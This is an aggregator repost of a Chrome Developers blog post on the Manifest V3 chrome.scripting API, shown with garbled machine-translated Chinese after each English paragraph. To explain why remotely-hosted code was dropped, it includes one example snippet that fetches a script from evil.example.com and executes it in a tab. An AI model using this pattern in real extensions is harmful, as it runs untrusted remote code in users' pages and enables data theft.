<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Chrome.scripting  -  Chrome开发人员 Chrome.scripting – Chrome Developers</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Chrome.scripting – Chrome Developers<br/>Chrome.scripting  -  Chrome开发人员 </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-06-09 20:50:52</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2021/6/4b43395a40c20d92941223c03f8cc003.png"><img src="http://img2.diglog.com/img/2021/6/4b43395a40c20d92941223c03f8cc003.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>Manifest V3 introduces a number of changes to Chrome&#39;s extension platform. In this post, we&#39;ll be exploring the motivations and changes introduced by one of the more notable changes: the introduction of the   chrome.scripting API.</p><p>Manifest V3引入了镀铬的一些变化和扩展平台。在这篇文章中，我们＆＃39; ll探索一个更具显着变化之一的动机和变化：Chrome.scripting API的引入。</p><p>  As the name might suggest,  chrome.scripting is a new namespace introduced in Manifest V3 responsible for script and style injection capabilities.</p><p>  由于名称可能会建议，Chrome.Scripting是一个在纸张和样式注入功能负责的清单V3中引入的新命名空间。</p><p> Developers that have created Chrome extensions in the past may be familiar with Manifest V2 methods on the  Tabs API like   chrome.tabs.executeScript and   chrome.tabs.insertCSS. These methods allow extensions to inject scripts and stylesheets into pages, respectively. In Manifest V3, these capabilities have moved to  chrome.scripting and we plan to expand this API with some new capabilities in the future.</p><p> 创建过去的Chrome扩展的开发人员可能熟悉Tabs API上的清单v2方法，如chrome.tabs.executeScript和Chrome.tabs.insertcss。这些方法允许分别将脚本和样式表注入页面。在Manifest V3中，这些功能已移动到Chrome.Scripting，我们计划将来扩展此API，并将在未来一些新功能。</p><p>  With a change like this, one of the first questions that tends to come up is, &#34;why?&#34;</p><p>  随着这样的变化，一个往来迎来的第一个问题之一是，＆＃34;为什么？＆＃34;</p><p> A few different factors lead to the Chrome team deciding to introduce a new namespace for scripting. First, the Tabs API is a bit of a junk drawer for features. Second, we needed to make breaking changes to the existing  executeScript API. Third, we knew that we wanted to expand scripting capabilities for extensions. Together, these concerns clearly defined a need for a new namespace to house scripting capabilities.</p><p> 一些不同的因素导致Chrome团队决定引入新的命名空间进行脚本。首先，标签API是用于功能的垃圾抽屉的一点。其次，我们需要对现有的execuSticrep API进行断开更改。第三，我们知道我们想扩展扩展的脚本功能。这些问题清楚地定义了对新名称空间来满足脚本功能的需求。</p><p>  One of the issues that has been bothering the Extensions Team for the past few years is that the  chrome.tabs API is overloaded. When this API was first introduced most of the capabilities it provided were related to the broad concept of a browser tab. Even at that point, though, it was a bit of a grab bag of features and over the years this collection has only grown.</p><p>  过去几年困扰扩展团队的问题之一是Chrome.Tabs API已过载。当第一次推出此API时，它提供的大部分功能与浏览器选项卡的广泛概念有关。然而，即使在那一点，它也是一系列的特征，而多年来，这一系列只有成长。</p><p> By the time Manifest V3 was released, the Tabs API had grown to cover basic tab management, selection management, window organization, messaging, zoom control, basic navigation, scripting, and a few other smaller capabilities. While these are all important, it can be a bit overwhelming for developers when they&#39;re getting started and for the Chrome team as we maintain the platform and consider requests from the developer community.</p><p> 通过释放时间张平的v3，Tabs API已生长为涵盖基本选项卡管理，选择管理，窗口组织，消息传递，缩放控制，基本导航，脚本以及其他一些较小功能。虽然这些都很重要，但在他们维护平台并考虑开发人员社区的帖子时，开发人员可能有点压倒性。 </p><p> Another complicating factor is that the  tabs permission is not well understood. While many other permissions restrict access to a given API (e.g.   storage), this permission is a bit unusual in that it only grants the extension access to sensitive properties on Tab instances (and by extension also impacts the Windows API). Understandably, many extension developers mistakenly think they need this permission in order to access methods on the Tabs API like  chrome.tabs.create or, more germanely,  chrome.tabs.executeScript. Moving functionality out of the Tabs API helps clear up some of this confusion.</p><p>另一个复杂因素是禁忌允许不太了解。虽然许多其他权限限制对给定API的访问（例如存储器），但此权限有点异常，因为它只授予TAB实例上的敏感属性的扩展访问（并且扩展也影响Windows API）。可以理解的是，许多扩展开发人员错误地认为他们需要此权限，以便访问像Chrome.Tabs.Create等标签API上的方法或更德国Chrome.Tabs.executeScript。从标签API中移动功能有助于清除一些混淆。</p><p>  When designing Manifest V3, one of the major issues that we wanted to address was abuse and malware enabled by &#34;remotely-hosted code&#34; - code that is executed, but not included in the extension package. It&#39;s common for abusive extension authors to execute scripts fetched from remote servers to steal user data, inject malware, and evade detection. While good actors also use this capability, we ultimately felt that it was simply too dangerous to remain as it was.</p><p>  在设计清单V3时，我们想要解决的主要问题之一是弊端和＃34启用的恶意软件;远程托管代码＆＃34; - 执行的代码，但不包含在扩展包中。它＆＃39;滥用扩展作者共同执行从远程服务器获取的脚本窃取用户数据，注入恶意软件和避免检测。虽然良好的演员也使用这种能力，但我们最终觉得它仍然太危险了。</p><p> There are a couple different ways that extensions can execute unbundled code, but the relevant one here is the Manifest V2  chrome.tabs.executeScript method. This method allows an extension to execute an arbitrary string of code in a target tab. This, in turn, means that a malicious developer can fetch an arbitrary script from a remote server and execute it inside any page the extension can access. We knew that if we wanted to address the remote code problem that we would have to drop this feature.</p><p> 扩展可以执行不同的不同方式，但这是这里的相关v2 chrome.tabs.executeScript方法。此方法允许扩展在目标选项卡中执行任意代码串。反过来，这意味着恶意开发人员可以从远程服务器获取任意脚本，并在扩展可以访问的任何页面内执行它。我们知道如果我们想解决我们必须丢弃此功能的远程代码问题。</p><p> ( async  function ( )  {   let result  =  await  fetch ( &#39;https://evil.example.com/malware.js&#39; ) ;   let script  =  await result . text ( ) ;   chrome .tabs . executeScript ( {  code : script ,   } ) ;  } ) ( ) ;</p><p> （async函数（）{让结果=等待获取（＆＃39; https：//evil.example.com/malware.js& n39;）;让脚本=等待结果。Text（）; chrome .tabs。executecript（ {code：script，}）;}）（）;</p><p> We also wanted to clean up some other, more subtle issues with the Manifest V2 version&#39;s design, and make the API a more polished and predictable tool.</p><p> 我们还希望清理其他一些更微妙的问题，用清单V2版本和＃39; S设计，使API成为更抛光和可预测的工具。</p><p> While we could have changed the signature of this method within the Tabs API, we felt that between these breaking changes and the introduction of new capabilities (covered in the next section), a clean break would be easier for everyone.</p><p> 虽然我们可以在标签API内更改此方法的签名，但我们觉得在这些破坏的变化和引入新功能之间（在下一节覆盖）之间，每个人都会更容易。</p><p>  Another consideration that fed into the Manifest V3 design process was a desire to introduce additional scripting capabilities to Chrome&#39;s extension platform. Specifically, we wanted to add support for dynamic content scripts and to expand the capabilities of the  executeScript method.</p><p>  进入清单V3设计过程的另一个考虑因素是将额外的脚本能力引入镀铬和＃39; S扩展平台。具体来说，我们希望为动态内容脚本添加支持，并展开execuSticre方法的功能。 </p><p> Dynamic content scripts support has been a long-standing feature request in Chromium. Today, Manifest V2 and V3 Chrome extensions can only statically declare content scripts in their  manifest.json file; the platform doesn&#39;t provide a way to register new content scripts, tweak content script registration, or unregister content scripts at runtime.</p><p>动态内容脚本支持在铬中是一个长期的功能请求。今天，Manifest V2和V3 Chrome扩展只能在其Manifest.json文件中静态声明内容脚本;该平台并不提供在运行时注册新内容脚本，调整内容脚本注册或取消注册内容脚本的方法。</p><p> While we knew that we wanted to tackle this feature request in Manifest V3, none of our existing APIs felt like the right home. We also considered aligning with Firefox on their  Content Scripts API, but very early on we identified a couple major drawbacks to this approach. First, we knew that we would have incompatible signatures (e.g. dropping support for the  code property). Second, our API had a different set of design constraints (e.g. needing a registration to persist beyond a service worker&#39;s lifetime). Finally, this namespace would also pigeonhole us to content script functionality where we&#39;re thinking about scripting in extensions more broadly.</p><p> 虽然我们知道我们想要在幻灯片中解决此功能请求，但我们的现有API都没有像正确的家一样。我们还考虑与Firefox对齐他们的内容脚本API，但很早，我们确定了对这种方法的几个主要缺点。首先，我们知道我们会有不兼容的签名（例如，丢弃对代码属性的支持）。其次，我们的API具有不同的设计约束（例如，需要注册以超越服务工作者和寿命）。最后，这个命名空间也会将我们归类到内容脚本功能，其中我们更广泛地考虑扩展脚本。</p><p> On the  executeScript front, we also wanted to expand what this API could do beyond what the Tabs API version supported. More specifically, we wanted to support functions and arguments, more easily target specific frames, and target non-&#34;tab&#34; contexts.</p><p> 在executecript front上，我们还想扩展此API可以超出所支持的标签版本的内容。更具体地说，我们希望支持功能和参数，更容易瞄准特定帧，并瞄准非＆＃34;标签＆＃34;背景。</p><p> Moving forward, we&#39;re also considering how extensions can interact with installed PWAs and other contexts that don&#39;t conceptually map to &#34;tabs.&#34;</p><p> 向前迈进，我们也考虑到延伸可以与安装的pwas和其他语境相互作用，也可以在概念上映射到＆＃34;标签。＆＃34;</p><p>  In the remainder of this post, I&#39;d like to take a closer look at the similarities and differences between   chrome.tabs.executeScript and   chrome.scripting.executeScript.</p><p>  在这篇文章的剩余部分中，我喜欢仔细看看Chrome.Tabs.executeScript和Chrome.Scripting.executeScript之间的相似之处和差异。</p><p>  While considering how the platform would need to evolve in light of remotely-hosted code restrictions, we wanted to find a balance between the raw power of arbitrary code execution and only allowing static content scripts. The solution we struck on was to allow extensions to inject a function as a content script and to pass an array of values as arguments.</p><p>  虽然考虑到平台如何根据远程托管的代码限制来发展，但我们希望在任意代码执行的原始功率之间找到平衡，并且仅允许静态内容脚本。我们击中的解决方案是允许扩展将函数注入内容脚本，并将值数组传递为参数。</p><p> Let&#39;s take a quick look at an (oversimplified) example. Say we wanted to inject a script that greeted the user by name when the user clicks the extension&#39;s action button (icon in the toolbar). In Manifest V2, we could dynamically construct a code string and execute that script in the current page.</p><p> 让＆＃39快速查看（超薄）示例。假设我们想在用户点击扩展名＆＃39; s动作按钮（工具栏中的图标）时注入一个脚本。在Manift V2中，我们可以动态构建代码字符串并在当前页面中执行该脚本。 </p><p> // Manifest V2 extension chrome .browserAction .onClicked . addListener ( async  ( tab )  =&gt;  {   let userReq  =  await  fetch ( &#39;https://example.com/greet-user.js&#39; ) ;   let userScript  =  await userReq . text ( ) ;   chrome .tabs . executeScript ( {   // userScript == &#39;alert(&#34;Hello, &lt;GIVEN_NAME&gt;!&#34;)&#39;  code : userScript ,   } ) ;  } ) ;</p><p>//清单V2扩展Chrome .browseraction .onclicked。 addListener（异步（标签）=＆gt; {Let UserReq =等待获取（＆＃39; https：///example.com/greeg-User.js&#39;）;让用户脚本= await userreq。text（）; chrome。标签。executecript（{// userscript ==＆＃39;警报（＆＃34; hello，＆lt; gend_name＆gt;＆＃34;）＆＃39;代码：用户签到，}）;}）;</p><p> While Manifest V3 extensions can&#39;t use code that isn&#39;t bundled with the extension, our goal was to preserve some of the dynamism that arbitrary code blocks enabled for Manifest V2 extensions. The function and arguments approach makes it possible for Chrome Web Store reviewers, users, and other interested parties to more accurately assess the risks an extension poses while also allowing developers to modify an extension&#39;s runtime behavior based on user settings or application state.</p><p> 虽然表明V3扩展可以＆＃39; t使用捆绑在扩展名的代码，我们的目标是保留一些动力，即为清单v2扩展为启用任意代码块。该函数和参数方法使Chrome Web Store Reviewers，用户和其他有关方面成为可能更准确地评估扩展姿势的风险，同时允许开发人员根据用户设置或应用程序状态修改扩展和＃39; s运行时行为。</p><p> // Manifest V3 extension  function  greetUser ( name )  {   alert (  ` Hello,   ${name } ! ` ) ;  } chrome .action .onClicked . addListener ( async  ( tab )  =&gt;  {   let userReq  =  await  fetch ( &#39;/https://example.com/user-data.json&#39; ) ;   let user  =  await userReq . json ( ) ;   let givenName  = user .givenName  ||  &#39;&lt;GIVEN_NAME&gt;&#39; ;   chrome .scripting . executeScript ( {  target :  {tabId : tab .id } ,  func : greetUser ,  args :  [givenName ] ,   } ) ;  } ) ;</p><p> //清单v3扩展函数greetUser（名称）{警报（`hello，$ {name}！`）; Chrome .action .clicked。 AddListener（async（tab）=＆gt; {let userreq = await获取（＆＃39; / https：//example.com/user-data.json&#39;）;让用户= await userreq。json（）;让给定名称=用户.givenname ||＆＃39;＆lt;＆＃39;; chrome。; chrome.scripting。executecript（{target：{tabid：tab .id}，func：greetUser，args：[gendname]，}）; }）;</p><p>  We also wanted to improve how developers interact with frames in the revised API. The Manifest V2 version of  executeScript allowed developers to target either all frames in a tab or a specific frame in the tab. You can use use  chrome.webNavigation.getAllFrames to get a list of all frames in a tab.</p><p>  我们还想改进开发人员如何在修订的API中与帧交互。 Manifest V2版本的executecript允许开发人员针对选项卡中的所有帧或选项卡中的特定帧。您可以使用使用chrome.webnavigation.getAllFrams获取选项卡中的所有帧的列表。</p><p> // Manifest V2 extension chrome .browserAction .onClicked . addListener ( ( tab )  =&gt;  {  chrome .webNavigation . getAllFrames ( {tabId : tab .id } ,  ( frames )  =&gt;  {   let frame1  = frames [ 0 ] .frameId ;   let frame2  = frames [ 1 ] .frameId ;   chrome .tabs . executeScript (tab .id ,  {  frameId : frame1 ,  file :  &#39;content-script.js&#39; ,   } ) ;  chrome .tabs . executeScript (tab .id ,  {  frameId : frame2 ,  file :  &#39;content-script.js&#39; ,   } ) ;   } ) ;  } ) ;</p><p> //清单V2扩展Chrome .browseraction .onclicked。 addListener（（标签）=＆gt; {Chrome.WebNavigation。GetAllFrame（{塔巴id：选项卡.ID}，（框架）=＆gt; {Let Frame1 =帧[0] .FrameID; Let Frame2 =帧[1] .FrameID; Chrome .tabs。executecript（标签.id，{frameId：frame1，文件：＆＃39; content-script.js＆＃39;，}）; chrome .tabs。executecript（tab.id，{frameId：frame2，文件： ＆＃39; content-script.js＆＃39;，}）;}）;}）;</p><p> In Manifest V3, we replaced the optional  frameId integer property in the options object with an optional  frameIds array of integers; this allows developers to target multiple frames in a single API call.</p><p> 在Manifest V3中，我们在选项对象中替换了选项对象中的可选FrameId Integer属性，其中包含一个整数的可选FrameIDS数组;这允许开发人员在单个API调用中瞄准多个帧。</p><p> // Manifest V3 extension chrome .action .onClicked . addListener ( async  ( tab )  =&gt;  {   let frames  =  await chrome .webNavigation . getAllFrames ( {tabId : tab .id } ) ;   let frame1  = frame [ 0 ] .frameId ;   let frame2  = frame [ 1 ] .frameId ;   chrome .scripting . executeScript ( {  target :  {  tabId : tab .id ,  frameIds :  [frame1 , frame2 ] ,   } ,  files :  [ &#39;content-script.js&#39; ] ,   } ) ;  } ) ;</p><p> //清单V3扩展Chrome。Acction .clicked。 addListener（异步（标签）=＆gt; {让帧=等待Chrome .WebNavigation。GetAllFrames（{Tabid：Tab .ID}）; Let Frame1 =帧[0] .FrameID; Let Frame2 =帧[1] .FrameID; Chrome .Scripting。executecript（{target：{tabid：tab .id，frameids：[frame1，frame2]，}，文件：[＆＃39; content-script.js＆＃39;]，}）; </p><p>  We&#39;ve also improved the way we return script injection results in Manifest V3. A &#34;result&#34; is basically the final statement evaluated in a script. Think of it like the value returned when you call  eval() or execute a block of code in the Chrome DevTools console, but serialized in order to pass results across processes.</p><p>我们还改善了我们回到脚本注入结果的方式，v＆＃39。 A＆＃34;结果＆＃34;基本上是在脚本中评估的最终陈述。想象它就像调用eval（）时返回的值，或者在Chrome Devtools控制台中执行一块代码，但序列化以跨进程传递结果。</p><p> In Manifest V2,  executeScript and  insertCSS would return an array of plain execution results. This is fine if you only have a single injection point, but result order is not guaranteed when injecting into multiple frames so there&#39;s no way to tell which result is associated with which frame.</p><p> 在Manifest V2中，Executecript和InsertCS将返回一系列普通执行结果。如果您只有单个注射点，则这很好，但是在将多个帧中注入到多个帧中时，不会保证结果订单，因此没有办法告诉哪个结果与哪个帧相关联。</p><p> For a concrete example, let&#39;s take a look at the  results arrays returned by a Manifest V2 and a Manifest V3 version of the same extension. Both versions of the extension will inject the same content script and we&#39;ll be comparing results on the same  demo page.</p><p> 对于具体的例子，让＆＃39; s查看由清单v2返回的结果阵列和同一扩展名的清单V3版本。两个版本的扩展名将注入相同的内容脚本和我们＆＃39; ll在同一个演示页面上比较结果。</p><p>  When we run the Manifest V2 version, we get back an array of  [1, 0, 5]. Which result corresponds to the main frame and which is for the iframe? The return value doesn&#39;t tell us, so we don&#39;t know for sure.</p><p>  当我们运行清单v2版本时，我们会返回[1,0,5]的数组。哪个结果对应于主框架，它是iframe？返回值并不告诉我们，所以我们不确定。</p><p> // Manifest V2 extension chrome .browserAction .onClicked . addListener ( ( tab )  =&gt;  {  chrome .tabs . executeScript ( {  allFrames :  true ,  file :  &#39;content-script.js&#39; ,   } ,  ( results )  =&gt;  {   // results == [1, 0, 5]   for  ( let result  of results )  {   if  (result  &gt;  0 )  {   // Do something with the frame... which one was it?   }   }   } ) ;  } ) ;</p><p> //清单V2扩展Chrome .browseraction .onclicked。 addListener（（tab）=＆gt; {Chrome .tabs。executecript（{allframes：true，file：＆＃39; content-script.js＆＃39;，}，（结果）=＆gt; {//结果== [ 1,0,5]用于（令结果结果）{if（结果＆gt; 0）{//与帧做某事......是哪一个？}}}）;}）;</p><p> In the Manifest V3 version,  results now contains an array of result objects instead of an array of just the evaluation results, and the result objects clearly identify the ID of the frame for each result. This makes it much easier for developers to utilize the result and take action on a specific frame.</p><p> 在清单V3版本中，结果现在包含一个结果对象数组而不是仅仅是评估结果的数组，而结果对象清楚地识别每个结果的帧的ID。这使得开发人员可以更容易利用结果并对特定帧采取动作。</p><p> // Manifest V3 extension chrome .action .onClicked . addListener ( async  ( tab )  =&gt;  {   let results  =  await chrome .scripting . executeScript ( {  target :  {tabId : tab .id , allFrames :  true } ,  files :  [ &#39;content-script.js&#39; ] ,   } ) ;   // results == [   // {frameId: 0, result: 1},   // {frameId: 1235, result: 5},   // {frameId: 1234, result: 0}   // ]    for  ( let result  of results )  {   if  (result .result  &gt;  0 )  {  console . log (  ` Found   ${result }  p tag(s) in frame   ${result .frameId } ` ) ;   // Found 1 p tag(s) in frame 0   // Found 5 p tag(s) in frame 1235   }   }  } ) ;</p><p> //清单V3扩展Chrome。Acction .clicked。 addListener（async（tab）=＆gt; {let结果=等待Chrome .scripting。executecript（{target：{tabid：tab .did，Allframes：True}，文件：[＆＃39; content-script.js＆＃39; ]，}）; //结果== [// {frameId：0，结果：1}，// {frameId：1235，结果：5}，// {frameId：1234，结果：0} //] （结果结果）{if（结果.result＆gt; 0）{控制台。日志（在帧$ {结果.frameID}'）的日志（找到$ {结果} p标签; //发现1 p标签（ s）在框架0 //框架1235}}}}）中找到5个pag（s）; </p><p>  Manifest version bumps present a rare opportunity to rethink and modernize extensions APIs. Our goal with Manifest V3 is to improve the end user experience by making extensions safer while also improving the developer experience. By introducing  chrome.scripting in Manifest V3, we were able to help clean up the Tabs API, to reimagine  executeScript for a more secure extensions platform, and to lay the groundwork for new scripting capabilities that will be coming later this year.</p><p>清单版本颠簸为重新思考和现代化扩展API提供了一个难得的机会。 我们用幻觉V3的目标是通过使延伸更安全的同时提高开发人员体验，改善最终用户体验。 通过介绍Chrome.Scripting在Manifest V3中，我们能够帮助清理标签API，以便为更安全的扩展平台进行重新通知，并为今年晚些时候奠定新的脚本功能的基础。 </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://developer.chrome.com/blog/crx-scripting-api/">https://developer.chrome.com/blog/crx-scripting-api/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/chrome/">#chrome</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/开发/">#开发</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/扩展/">#扩展</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>